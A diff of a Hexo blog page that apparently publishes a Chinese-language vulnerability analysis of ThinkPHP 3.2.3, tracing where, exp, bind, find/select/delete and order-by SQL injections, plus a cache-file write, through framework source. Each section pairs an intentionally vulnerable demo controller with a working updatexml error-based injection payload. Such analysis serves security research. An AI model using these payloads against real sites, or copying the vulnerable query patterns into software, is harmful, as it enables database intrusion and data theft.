@@ -1,53 +1,194 @@
+
 <!DOCTYPE html>
-<html>
-<head>
-  <meta charset="UTF-8" />
-  <title>Hexo</title>
-  <link rel="icon" href="favicon.ico"/>
-  <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <meta name="viewport" content="width=device-width,initial-scale=1">
-  
-<link rel="stylesheet" href="/css/ionicons.min.css">
-
-  
-<link rel="stylesheet" href="/css/milligram.min.css">
-
-  
-<link rel="stylesheet" href="/css/comfortaa.css">
-
-  
-<link rel="stylesheet" href="/css/source-sans-pro.css">
-
-  
-<link rel="stylesheet" href="/css/animate.min.css">
-
-  
-<link rel="stylesheet" href="/css/nprogress.css">
-
-  
-<link rel="stylesheet" href="/css/loaders.min.css">
-
-  
-<link rel="stylesheet" href="/css/atom-one-light.css">
-
-  
-<link rel="stylesheet" href="/css/app.css">
-
-<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>ThinkPHP3.2.3 注入分析 | Hexo</title>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.17.1/styles/railscasts.css">
+    <link rel="stylesheet" href="/lightx.css"/>
+    <link rel="manifest" href="/manifest.json" />
+    <link rel="apple-touch-icon" href="/icon512.png">
+    <meta name="theme-color" content="#ffffff"/>
+    
+  <meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
 </head>
-<body>
-  <div id="app"></div>
-  <script type="text/javascript">
-    window.root = "/"
+  <body>
+    <script>
+      if ('serviceWorker' in navigator) {
+        window.addEventListener('load', function () {
+          navigator.serviceWorker.register('/sw.js', {scope: '/'})
+            .then(function (registration) {
+              // console.log('ServiceWorker registration successful with scope: ', registration.scope);
+            })
+            .catch(function (err) {
+              console.log('ServiceWorker registration failed: ', err);
+            });
+        });
+      }
+    </script>
+  <div id="page-container">
+    <div id="content-wrap">
+      <div class="wrapper">
+        <div class="container">
+            <nav>
+    <ul>
+      <li><a href="/">Hexo</a></li>
+      <li><a href="/archives">Archives</a></li>
+      <li><a href="/about">About</a></li>
+    </ul>
+</nav>
+
+            <article>
+  <h1>ThinkPHP3.2.3 注入分析</h1>
+  <div class="contents">
+    <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#where注入"><span class="toc-text">where注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exp注入"><span class="toc-text">exp注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#bind注入"><span class="toc-text">bind注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#find-select-delete注入"><span class="toc-text">find&#x2F;select&#x2F;delete注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#order-by注入"><span class="toc-text">order by注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#缓存漏洞"><span class="toc-text">缓存漏洞</span></a></li></ol>
+  </div>
+  <h4 id="where注入"><a href="#where注入" class="headerlink" title="where注入"></a><strong>where注入</strong></h4><p>在控制器中，写个demo，利用字符串方式作为where传参时存在注入</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">getuser</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $user = M(<span class="string">'User'</span>)-&gt;where(<span class="string">'id='</span>.I(<span class="string">'id'</span>))-&gt;find();</span><br><span class="line">    dump($user);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在变量user地方进行断点，PHPSTROM F7进入，I方法获取传入的参数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span>(strtolower($method)) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'get'</span>     :   </span><br><span class="line">        	$input =&amp; $_GET;</span><br><span class="line">        	<span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'post'</span>    :   </span><br><span class="line">        	$input =&amp; $_POST;</span><br><span class="line">        	<span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'put'</span>     :   </span><br><span class="line">        	<span class="keyword">if</span>(is_null($_PUT))&#123;</span><br><span class="line">            	parse_str(file_get_contents(<span class="string">'php://input'</span>), $_PUT);</span><br><span class="line">        	&#125;</span><br><span class="line">        	$input 	=	$_PUT;        </span><br><span class="line">        	<span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'param'</span>   :</span><br><span class="line">            <span class="keyword">switch</span>($_SERVER[<span class="string">'REQUEST_METHOD'</span>]) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">'POST'</span>:</span><br><span class="line">                    $input  =  $_POST;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">'PUT'</span>:</span><br><span class="line">                	<span class="keyword">if</span>(is_null($_PUT))&#123;</span><br><span class="line">                    	parse_str(file_get_contents(<span class="string">'php://input'</span>), $_PUT);</span><br><span class="line">                	&#125;</span><br><span class="line">                	$input 	=	$_PUT;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    $input  =  $_GET;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"> ......</span><br></pre></td></tr></table></figure>
+
+<p>重点看过滤函数</p>
+<p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/1.jpg" alt=""></p>
+<p>先利用htmlspecialchars函数过滤参数，在402行利用think_filter函数过滤常规sql函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">think_filter</span><span class="params">(&amp;$value)</span></span>&#123;</span><br><span class="line">	<span class="comment">// TODO 其他安全过滤</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// 过滤查询特殊字符</span></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i'</span>,$value))&#123;</span><br><span class="line">        $value .= <span class="string">' '</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在where方法中，将$where的值放入到options[“where”]数组中</p>
+<p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/2.png" alt=""></p>
+<p>继续跟进查看find方法，第748行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$options     =   <span class="keyword">$this</span>-&gt;_parseOptions($options);</span><br></pre></td></tr></table></figure>
+
+<p>在数组$options中增加’table’=&gt;’tp_user’，’model’=&gt;’User’，随后F7跟进select方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">select</span><span class="params">($options=array<span class="params">()</span>)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;model  =   $options[<span class="string">'model'</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;parseBind(!<span class="keyword">empty</span>($options[<span class="string">'bind'</span>])?$options[<span class="string">'bind'</span>]:<span class="keyword">array</span>());</span><br><span class="line">        $sql    = <span class="keyword">$this</span>-&gt;buildSelectSql($options);</span><br><span class="line">        $result   = <span class="keyword">$this</span>-&gt;query($sql,!<span class="keyword">empty</span>($options[<span class="string">'fetch_sql'</span>]) ? <span class="keyword">true</span> : <span class="keyword">false</span>);</span><br><span class="line">        <span class="keyword">return</span> $result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>跟进buildSelectSql方法，继续在跟进parseSql方法，这里可以看到生成完整的sql语句</p>
+<p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/3.png" alt=""></p>
+<p>这里主要查看parseWhere方法</p>
+<p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/4.png" alt=""></p>
+<p>跟进parseThinkWhere方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseThinkWhere</span><span class="params">($key,$val)</span> </span>&#123;</span><br><span class="line">        $whereStr   = <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">switch</span>($key) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'_string'</span>:</span><br><span class="line">                <span class="comment">// 字符串模式查询条件</span></span><br><span class="line">                $whereStr = $val;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'_complex'</span>:</span><br><span class="line">                <span class="comment">// 复合查询条件</span></span><br><span class="line">                $whereStr = substr(<span class="keyword">$this</span>-&gt;parseWhere($val),<span class="number">6</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
+
+<p>$key为_string，所以$whereStr为传入的参数的值，最后parserWhere方法返回(id=1p)，所以最终payload为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1) and 1&#x3D;updatexml(1,concat(0x7e,(user()),0x7e),1)--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/5.png" alt=""></p>
+<h4 id="exp注入"><a href="#exp注入" class="headerlink" title="exp注入"></a><strong>exp注入</strong></h4><p>漏洞demo，这里使用全局数组进行传参(不要用I方法)，漏洞才能生效</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">getuser</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $User = D(<span class="string">'User'</span>);</span><br><span class="line">        $map = <span class="keyword">array</span>(<span class="string">'id'</span> =&gt; $_GET[<span class="string">'id'</span>]);</span><br><span class="line">        $user = $User-&gt;where($map)-&gt;find();</span><br><span class="line">        dump($user);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>直接在$user进行断点，F7跟进，跳过where方法，跟进find-&gt;select-&gt;buildSelectSql-&gt;parseSql-&gt;parseWhere</p>
+<p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/1.png" alt=""></p>
+<p>跟进parseWhereItem方法，此时参数$val为一个数组，{‘exp’,’sql注入exp’}</p>
+<p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/2.png" alt=""></p>
+<p>此时当$exp满足exp时，将参数和值就行拼接，所以最终paylaod为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id[0]&#x3D;exp&amp;id[1]&#x3D;&#x3D;1 and 1&#x3D;(updatexml(1,concat(0x7e,(user()),0x7e),1))--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/3.png" alt=""></p>
+<p>上面至于为什么不能用I方法，原因是在过滤函数think_filter中能匹配到exp字符，所以在exp字符后面加了一个空格，导致在parseWhereItem方法中无法等于exp。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i'</span>,$value))</span><br></pre></td></tr></table></figure>
+
+<h4 id="bind注入"><a href="#bind注入" class="headerlink" title="bind注入"></a><strong>bind注入</strong></h4><p>漏洞demo</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">getuser</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $data[<span class="string">'id'</span>] = I(<span class="string">'id'</span>);</span><br><span class="line">        $uname[<span class="string">'username'</span>] = I(<span class="string">'username'</span>);</span><br><span class="line">        $user = M(<span class="string">'User'</span>)-&gt;where($data)-&gt;save($uname);</span><br><span class="line">        dump($user);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>F8跟进save方法</p>
+<p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/4.png" alt=""></p>
+<p>生成sql语句在update方法中</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span><span class="params">($data,$options)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;model  =   $options[<span class="string">'model'</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;parseBind(!<span class="keyword">empty</span>($options[<span class="string">'bind'</span>])?$options[<span class="string">'bind'</span>]:<span class="keyword">array</span>());</span><br><span class="line">        $table  =   <span class="keyword">$this</span>-&gt;parseTable($options[<span class="string">'table'</span>]);</span><br><span class="line">        $sql   = <span class="string">'UPDATE '</span> . $table . <span class="keyword">$this</span>-&gt;parseSet($data);</span><br><span class="line">        <span class="keyword">if</span>(strpos($table,<span class="string">','</span>))&#123;<span class="comment">// 多表更新支持JOIN操作</span></span><br><span class="line">            $sql .= <span class="keyword">$this</span>-&gt;parseJoin(!<span class="keyword">empty</span>($options[<span class="string">'join'</span>])?$options[<span class="string">'join'</span>]:<span class="string">''</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $sql .= <span class="keyword">$this</span>-&gt;parseWhere(!<span class="keyword">empty</span>($options[<span class="string">'where'</span>])?$options[<span class="string">'where'</span>]:<span class="string">''</span>);</span><br><span class="line">        <span class="keyword">if</span>(!strpos($table,<span class="string">','</span>))&#123;</span><br><span class="line">            <span class="comment">//  单表更新支持order和lmit</span></span><br><span class="line">            $sql   .=  <span class="keyword">$this</span>-&gt;parseOrder(!<span class="keyword">empty</span>($options[<span class="string">'order'</span>])?$options[<span class="string">'order'</span>]:<span class="string">''</span>)</span><br><span class="line">                .<span class="keyword">$this</span>-&gt;parseLimit(!<span class="keyword">empty</span>($options[<span class="string">'limit'</span>])?$options[<span class="string">'limit'</span>]:<span class="string">''</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $sql .=   <span class="keyword">$this</span>-&gt;parseComment(!<span class="keyword">empty</span>($options[<span class="string">'comment'</span>])?$options[<span class="string">'comment'</span>]:<span class="string">''</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;execute($sql,!<span class="keyword">empty</span>($options[<span class="string">'fetch_sql'</span>]) ? <span class="keyword">true</span> : <span class="keyword">false</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>在parseSet方法中，可以将传入的参数替换成:0</p>
+<p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/5.png" alt=""></p>
+<p>在bindParam方法中，$this-&gt;bind属性返回array(‘:0’=&gt;参数值)</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">bindParam</span><span class="params">($name,$value)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;bind[<span class="string">':'</span>.$name]  =   $value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>继续跟进parseWhere-&gt;parseWhereItem方法，当exp为bind时，就会在参数值前面加个冒号(:)</p>
+<p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/6.png" alt=""></p>
+<p>由于在sql语句中有冒号，继续跟进excute方法，这里将:0替换成了第二个参数的值</p>
+<p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/7.png" alt=""></p>
+<p>所以最终的payload为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id[0]&#x3D;bind&amp;id[1]&#x3D;0 and 1&#x3D;(updatexml(1,concat(0x7e,(user()),0x7e),1))&amp;username&#x3D;fanxing</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/8.png" alt=""></p>
+<h4 id="find-select-delete注入"><a href="#find-select-delete注入" class="headerlink" title="find/select/delete注入"></a><strong>find/select/delete注入</strong></h4><p>先分析find注入，在控制器中写个漏洞demo</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getuser</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $user = M(<span class="string">'User'</span>)-&gt;find(I(<span class="string">'id'</span>));</span><br><span class="line">    dump($user);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>当传入id[where]=1p时候，在user进行断点，F7跟进find-&gt;_parseOptions方法</p>
+<p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/9.png" alt=""></p>
+<p>$options[‘where’]为字符串，导致不能执行_parseType方法转化数据，进行跟进select-&gt;buildSelectSql-&gt;parseSql-&gt;parseWhere方法，传入的$where为字符串，直接执行了if语句</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseWhere</span><span class="params">($where)</span> </span>&#123;</span><br><span class="line">        $whereStr = <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">if</span>(is_string($where)) &#123;</span><br><span class="line">            <span class="comment">// 直接使用字符串条件</span></span><br><span class="line">            $whereStr = $where;</span><br><span class="line">            ......</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">empty</span>($whereStr)?<span class="string">''</span>:<span class="string">' WHERE '</span>.$whereStr;</span><br></pre></td></tr></table></figure>
+
+<p>当传入id=1p，就不能进行注入了，具体原因在find-&gt;_parseOptions-&gt;_parseType方法，将传入的参数进行了强转化为整形</p>
+<p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/10.png" alt=""></p>
+<p>所以，payload为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id[where]&#x3D;1 and 1&#x3D;updatexml(1,concat(0x7e,(user()),0x7e),1)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/11.png" alt=""></p>
+<p>select和delete原理同find方法一样，只是delete方法多增加了一个判断是否为空</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($options[<span class="string">'where'</span>]))&#123;</span><br><span class="line">            <span class="comment">// 如果条件为空 不进行删除操作 除非设置 1=1</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;        </span><br><span class="line">        <span class="keyword">if</span>(is_array($options[<span class="string">'where'</span>]) &amp;&amp; <span class="keyword">isset</span>($options[<span class="string">'where'</span>][$pk]))&#123;</span><br><span class="line">            $pkValue            =  $options[<span class="string">'where'</span>][$pk];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">false</span> === <span class="keyword">$this</span>-&gt;_before_delete($options)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="order-by注入"><a href="#order-by注入" class="headerlink" title="order by注入"></a><strong>order by注入</strong></h4><p>先在控制器中写个漏洞demo</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">user</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $data[<span class="string">'username'</span>] = <span class="keyword">array</span>(<span class="string">'eq'</span>,<span class="string">'admin'</span>);</span><br><span class="line">    $user = M(<span class="string">'User'</span>)-&gt;where($data)-&gt;order(I(<span class="string">'order'</span>))-&gt;find();</span><br><span class="line">    dump($user);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在user变量处断点，F7跟进，find-&gt;select-&gt;buildSelectSql-&gt;parseSql方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;parseOrder(!<span class="keyword">empty</span>($options[<span class="string">'order'</span>])?$options[<span class="string">'order'</span>]:<span class="string">''</span>),</span><br></pre></td></tr></table></figure>
+
+<p>当$options[‘order’]参数参在时，跟进parseOrder方法</p>
+<p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/12.png" alt=""></p>
+<p>当不为数组时，直接返回order by + 注入pyload，所以注入payload为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">order&#x3D;id and(updatexml(1,concat(0x7e,(select user())),0))</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/13.png" alt=""></p>
+<h4 id="缓存漏洞"><a href="#缓存漏洞" class="headerlink" title="缓存漏洞"></a><strong>缓存漏洞</strong></h4><p>在ThinkPHP3.2中，缓存函数有F方法和S方法，两个方法有什么区别呢，官方介绍如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">F方法：相当于PHP自带的file_put_content和file_get_content函数，没有太多存在时间的概念，是文件存储数据的方式。常用于文件配置。</span><br><span class="line">S方法：文件缓存，有生命时长，时间到期后缓存内容会得到更新。常用于单页面data缓存。</span><br></pre></td></tr></table></figure>
+
+<p>这里F方法就不介绍了，直接看S方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">    S(<span class="string">'name'</span>,I(<span class="string">'test'</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>跟进查看S方法</p>
+<p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/14.png" alt=""></p>
+<p>set方法写入缓存</p>
+<p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/15.png" alt=""></p>
+<p>跟进filename方法，此方法获取写入文件的路径，保存在../Application/Runtime/Temp目录下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">filename</span><span class="params">($name)</span> </span>&#123;</span><br><span class="line">        $name	=	md5(C(<span class="string">'DATA_CACHE_KEY'</span>).$name);</span><br><span class="line">        <span class="keyword">if</span>(C(<span class="string">'DATA_CACHE_SUBDIR'</span>)) &#123;</span><br><span class="line">            <span class="comment">// 使用子目录</span></span><br><span class="line">            $dir   =<span class="string">''</span>;</span><br><span class="line">            <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;C(<span class="string">'DATA_PATH_LEVEL'</span>);$i++) &#123;</span><br><span class="line">                $dir	.=	$name&#123;$i&#125;.<span class="string">'/'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(!is_dir(<span class="keyword">$this</span>-&gt;options[<span class="string">'temp'</span>].$dir)) &#123;</span><br><span class="line">                mkdir(<span class="keyword">$this</span>-&gt;options[<span class="string">'temp'</span>].$dir,<span class="number">0755</span>,<span class="keyword">true</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            $filename	=	$dir.<span class="keyword">$this</span>-&gt;options[<span class="string">'prefix'</span>].$name.<span class="string">'.php'</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $filename	=	<span class="keyword">$this</span>-&gt;options[<span class="string">'prefix'</span>].$name.<span class="string">'.php'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;options[<span class="string">'temp'</span>].$filename;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>并将S传入的name进行md5值作为文件名，最终通过file_put_contents函数写入文件。</p>
+<p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/16.png" alt=""></p>
+
+  
+  <p class="copyright"><strong>Links: <a href="http://yoursite.com/2020/02/24/ThinkPHP3.2.3%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">http://yoursite.com/2020/02/24/ThinkPHP3.2.3%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</a></strong></p>  
+</article>
+
+<div id="comment">
+    
+</div>
+        </div>
+      </div>
+    </div>
+    <div id="footer">
+      <div class="wrapper">
+        <div class="container">
+          
+<button id="back-top" onclick="window.scrollTo({top:0,behavior:'smooth'})">TOP</button>
+<footer>
+    <div>
+        <p>
+            © 2020 <a href="http://yoursite.com">John Doe</a>.
+            Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>.
+            Theme <a href="https://github.com/songquanpeng/hexo-theme-lightx" target="_blank" rel="noopener">lightx</a>.
+            
+        </p>
+    </div>
+</footer>
+
+        </div>
+      </div>
+    </div>
+  </div>
+  
+  
+  <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@latest/build/highlight.min.js"></script>
+  <script>
+    hljs.initHighlightingOnLoad();
   </script>
-  
-<script src="/js/manifest.js"></script>
-
-  
-<script src="/js/vendor.js"></script>
-
-  
-<script src="/js/app.js"></script>
-
-</body>
+  </body>
 </html>
